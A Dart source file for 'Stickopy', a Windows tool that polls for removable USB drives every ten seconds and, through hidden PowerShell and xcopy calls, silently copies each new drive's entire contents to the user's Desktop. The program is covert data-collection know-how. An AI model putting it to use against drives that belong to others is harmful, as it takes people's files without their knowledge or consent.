//  stickopy.dart

//   Stickopy allows you to copy the whole content of a USB drive automatically
// (when plugged), quickly and quietly.

//   Copyright (C) 2021  Firmin Launay (FLA Coding)

//   This program is free software: you can redistribute it and/or modify it under
// the terms of the GNU General Public License as published by the Free Software
// Foundation, either version 3 of the License, or (at your option) any later
// version.

//   This program is distributed in the hope that it will be useful, but WITHOUT
// ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
// FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.

//   You should have received a copy of the GNU General Public License along with
// this program.  If not, see <https://www.gnu.org/licenses/>.

import "dart:io";
import "dart:convert";
import "dart:async";
import "global_var.dart" as glb;
import "arg_display.dart" as arg;

main(List<String> args) {
  arg.ArgDisplay dispArg = new arg.ArgDisplay();
  if (args.contains("license"))
    return dispArg.license(); // Display license if the argument is passed.
  else if (args.contains("version"))
    return dispArg.version();
  else if (args.contains("help") || args.contains("--help"))
    return dispArg.help(); // Display help if the argument is passed.
  Process.run(
      "powershell", ["-WindowStyle", "Hidden", "-command", "echo Stickopy"]);

  glb.Global gl = new glb.Global();
  gl.copied = [];

  new Timer.periodic(new Duration(seconds: 10), (Timer t) {
    periodic(gl);
  }); // Run the function periodic() each 10 seconds.
}

periodic(gl) {
  Process.run('wmic', [
    'logicaldisk',
    'where',
    'drivetype=2',
    'get',
    'DeviceID'
  ]) // Check all drives of type "2" (= removable disk) connected to the device.

      .then((result) {
    String output = result.stdout;
    output = output.replaceAll("DeviceID", "").replaceAll(
        " ", ""); // Remove all useless infos in the output of the command.

    LineSplitter ls = new LineSplitter();
    List<String> driveLetters =
        ls.convert(output); // Divide the output into a List.

    driveLetters.removeWhere(
        (content) => content == ""); // Remove empty elements of the list.

    for (String deviceID in driveLetters) {
      // Iterate through all disponible removable disks.
      Process.run('wmic', [
        'logicaldisk',
        'where',
        'DeviceID="$deviceID"',
        'get',
        'VolumeName'
      ]) // Check the volume name of the drives.

          .then((result) {
        String output = result.stdout;
        output = output.replaceAll("VolumeName", "").replaceAll(
            " ", ""); // Remove all useless infos in the output of the command.

        LineSplitter ls = new LineSplitter();
        List<String> volNames =
            ls.convert(output); // Divide the output into a List.

        volNames.removeWhere(
            (content) => content == ""); // Remove empty elements of the list.

        for (String volName in volNames) {
          // Iterate through the names of the volume (there shouldn't be more than one, but who knows, it's Windows after all ¯\_(ツ)_/¯).
          int current_timestamp =
              ((DateTime.now().millisecondsSinceEpoch) / 1000)
                  .round(); // Get current timestamp.
          bool to_copy = true;
          Process.run("powershell", [
            "-command",
            "Get-ChildItem $deviceID\\ | Measure-Object -Property Length -sum"
          ]).then((result) {
            // Check how much the drive to copy is filled.
            LineSplitter ls = new LineSplitter();
            List<String> output = ls.convert(result.stdout
                .replaceAll(" ", "")); // Convert the output into a usable list.
            output.removeWhere((content) => content == "");
            String size = "";
            for (String line in output) {
              if (line.contains("Sum")) {
                // Select the important element of the list.
                size = line;
                break;
              }
            }
            if (size != "") {
              size = size.replaceAll("Sum", "").replaceAll(":", "");
              int fileSize = int.parse(size); // Get a usable size.

              for (var device in gl.copied) {
                if (device["deviceID"] ==
                        deviceID && // Check if drive has to be copied or if it has already been done.
                    device["volName"] == volName &&
                    (fileSize - 100) < device["size"] &&
                    device["size"] < (fileSize + 100)) {
                  to_copy = false;
                }
              }
              if (to_copy) {
                // Do the following if the USB has to be copied.
                String deviceID_simple = deviceID.replaceAll(":", "");
                Process.run("powershell", [
                  // Copy the content of the drive.
                  "-command",
                  "xcopy /E /I " +
                      deviceID +
                      "\\ " +
                      Platform.environment['UserProfile']! +
                      "\\Desktop\\" +
                      deviceID_simple +
                      "_drive_" +
                      "$current_timestamp"
                ]);
                Map data = {
                  // Map that contains info to write.
                  "deviceID": deviceID,
                  "volName": volName,
                  "size": fileSize
                };
                gl.copied.add(data); // Write info to the global variable
              }
            }
          });
        }
      });
    }
  });
}
